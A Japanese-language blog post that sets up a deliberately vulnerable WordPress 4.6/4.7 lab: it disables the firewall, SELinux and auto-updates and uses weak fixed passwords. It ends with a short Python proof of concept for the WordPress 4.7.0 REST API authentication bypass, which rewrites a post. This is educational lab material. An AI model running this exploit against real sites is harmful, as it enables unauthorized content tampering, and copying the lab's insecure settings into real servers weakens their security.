---
layout: post
title:  "WordPress Build & Crack"
date:   2018-10-29
permalink: /security/:title
categories: Security
tags: WordPress
excerpt: WordPressの構築とクラッキング
mathjax: false
---

* content
{:toc}

# 環境構築

## php
```
# phpのインストール
yum install -y php php-mysql

# phpが動作することを確認
php -r 'print "hello world\n"'
```

## Apache httpd
```
# Apache httpdの起動
systemctl enable httpd
systemctl start httpd

# テストページの設置
cat > /var/www/html/index.php << END
<?php
phpinfo();
?>
END
```

### (option)firewalld/selinux
検証環境を手早く構築するためにセキュリティ機構を停止しています。
本来は適切なアクセス許可を付与するべきです。
```
# ファイアウォールの停止
systemctl stop firewalld

# SELinuxの停止
setenforce 0
```

テストページにアクセスして動作確認します。

![](/images/wordpress/phpinfo.png)

## MySQL(MariaDB)
WordpressのバックエンドDBのMySQLを用意します。
ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。
```
# MariaDBのインストールと起動
yum install -y mariadb mariadb-server
systemctl enable mariadb
systemctl start mariadb

# データベースの初期化スクリプトを作成
cat > /tmp/init.sql << END
set password for root@localhost=password('wordpress');
insert into user set user="wpadmin", password=password("wordpress"), host="localhost";
create database wpdb;
grant all on wpdb.* to wpadmin;
flush privileges;
END

# データベースの初期化スクリプトを実行
mysql -u root -D mysql < /tmp/init.sql

# 以下の設定が完了したことを確認
# - rootユーザーのパスワードが変更されていること
# - wpdbデータベースが作成されていること
# - wpdbデータベースの権限を持つwpadminユーザーが作成されていること
echo 'select Db, User from db;'| mysql -u root -D mysql -pwordpress

# wpadminユーザーでログインできることを確認
echo 'show tables;'|mysql -u wpadmin -D wpdb -pwordpress
```

## wordpress
wordpress公式が古いバージョンのWordPressを配布しています。
利用する脆弱性に応じたWordPressを取得してください。
例としてWordPress4.6.0の設置手順を記載します。
```
# wordpressのダウンロードと設置
wget https://ja.wordpress.org/wordpress-4.6-ja.tar.gz -O /tmp/wordpress-4.6-ja.tar.gz
tar -zxvf /tmp/wordpress-4.6-ja.tar.gz -C /var/www/html/
mv /var/www/html/wordpress/ /var/www/html/4.6.0/

# アクセス権限をapache:apacheに変更
chown -R apache: /var/www/html/4.6.0
```
ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。
いくつかの項目を埋めてwp-config.php（Wordpressの設定ファイル）を作成します。
![](/images/wordpress/setup-config.png)

MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
ここで指定するユーザーはサイトの管理者ではありません。
![](/images/wordpress/setupconfig2.png)

wp-config.phpが作成されたらこの画面が表示されます。
まだインストール実行をクリックしないでください。
![](/images/wordpress/setupconfig3.png)

今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
```
# Wordpressの自動アップデートを無効化
echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.6.0/wp-config.php
```

自動更新を無効化したらインストール実行をクリックします。
ここで指定するユーザーがサイトの管理者になります。
パスワードを忘れないようにメモしてください。
![](/images/wordpress/setupconfig4.png)

サイトの情報を設定してWordPressをインストールをクリックすれば構築は完了です。
![](/images/wordpress/installcomplete.png)

Hello world!にアクセスできることを確認します。
![](/images/wordpress/wpindex.png)

### (option)wp_posts
WordPressのコンテンツデータはデータベースに格納されています。
mysqlにアクセスすることで投稿内容を確認できます。
```
# wpdbデータベースにテーブルが増えている事を確認
echo "show tables;" | mysql -u wpadmin -D wpdb -pwordpress

# postsテーブル（投稿に関する情報）を確認
echo "select * from wp_46posts;" | mysql -u wpadmin -D wpdb -pwordpress
```
# REST API Vulnerability
WordPress4.7.0からREST APIが実装されました。
APIを介してコンテンツの取得、更新、削除が行えます。
REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
```
http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
```
WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
例えば以下のコードはWordPress4.7.0のHello World!ページを書き換えます。
```
#!/usr/bin/python
import urllib, urllib2
url = "http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/1/?id=1abc"
payload = {'content': 'Your are hacked!!'}
payload = urllib.urlencode(payload)
request = urllib2.Request(url, payload)
urllib2.urlopen(request)
```
